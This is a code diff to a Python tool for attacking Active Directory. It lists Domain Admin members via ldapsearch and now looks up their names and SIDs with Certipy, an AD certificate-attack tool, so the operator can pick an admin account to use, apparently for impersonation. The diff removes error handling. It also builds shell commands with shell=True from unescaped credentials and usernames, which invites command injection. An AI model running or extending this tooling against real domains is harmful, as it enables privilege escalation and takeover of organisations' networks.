@@ -24,29 +24,24 @@ def get_domain_admins(args):
         print("\033[91m[-] Failed to retrieve Domain Admin members.\033[0m")
         return None
 
-    member_dns = [line.split("member:")[1].strip() for line in result.stdout.splitlines() if line.startswith("member:")]
-    if not member_dns:
-        print("\033[93m[!] No members found in Domain Admins.\033[0m")
-        return None
+    member_dns = [line.split("CN=")[1].split(",")[0] for line in result.stdout.splitlines() if line.startswith("member:")]
 
     domain_admins = []
     for dn in member_dns:
-        user_cmd = (
-            f"ldapsearch -x -LLL -H ldap://{args.dc_ip} -D '{args.domain_user}@{args.domain}' "
-            f"-w '{args.domain_pass}' -b '{dn}' sAMAccountName objectSid"
-        )
+        user_cmd = f"certipy.pyz account read -user {dn} -u {args.domain_user}@{args.domain} -p {args.domain_pass} -dc-ip {args.dc_ip}"
         user_result = subprocess.run(user_cmd, shell=True, capture_output=True, text=True)
-        if user_result.returncode != 0:
-            continue
 
         username, sid = None, None
         for line in user_result.stdout.splitlines():
-            if line.startswith("sAMAccountName:"):
-                username = line.split(":", 1)[1].strip()
-            elif line.startswith("objectSid:"):
-                sid_raw = line.split(":", 1)[1].strip()
-                # Convert space-separated SID bytes to proper SID string
-                sid = convert_ldap_sid_to_string(sid_raw)
+            if ':' not in line:
+                continue
+            key, value = line.split(":", 1)
+            key = key.strip()
+            value = value.strip()
+            if key == "sAMAccountName":
+                username = value
+            elif key == "objectSid":
+                sid = value
 
         if username and sid:
             entry = f"{username.upper()}@{args.domain.upper()}: {sid}"
@@ -58,20 +53,22 @@ def get_domain_admins(args):
         return None
 
     choice = input("\nSelect a domain admin to use (by number): ")
-    try:
-        selected = domain_admins[int(choice) - 1]
-        print(f"\n\033[94m[Selected Domain Admin]\033[0m\n  {selected}\n")
-        return selected
-    except (ValueError, IndexError):
-        print("\033[91m[-] Invalid selection.\033[0m")
-        return None
+    selected = domain_admins[int(choice) - 1]
+    print(f"\n\033[94m[Selected Domain Admin]\033[0m\n  {selected}\n")
+    return selected
 
-def convert_ldap_sid_to_string(raw_sid):
-    # raw_sid is like: 1 5 21 1886521464 168325408 1675894538 500
-    parts = raw_sid.split()
-    if len(parts) < 4:
-        return "Invalid SID"
-    revision = parts[0]
-    identifier_authority = parts[1]
-    subauthorities = parts[2:]
-    return f"S-{revision}-{identifier_authority}-" + "-".join(subauthorities)
+def get_user_sid(args, user):
+    user_cmd = f"certipy.pyz account read -user {user} -u {args.domain_user}@{args.domain} -p {args.domain_pass} -dc-ip {args.dc_ip}"
+    user_result = subprocess.run(user_cmd, shell=True, capture_output=True, text=True)
+    username, sid = None, None
+    for line in user_result.stdout.splitlines():
+        if ':' not in line:
+            continue
+        key, value = line.split(":", 1)
+        key = key.strip()
+        value = value.strip()
+        if key == "sAMAccountName":
+            username = value
+        elif key == "objectSid":
+            sid = value
+    return sid
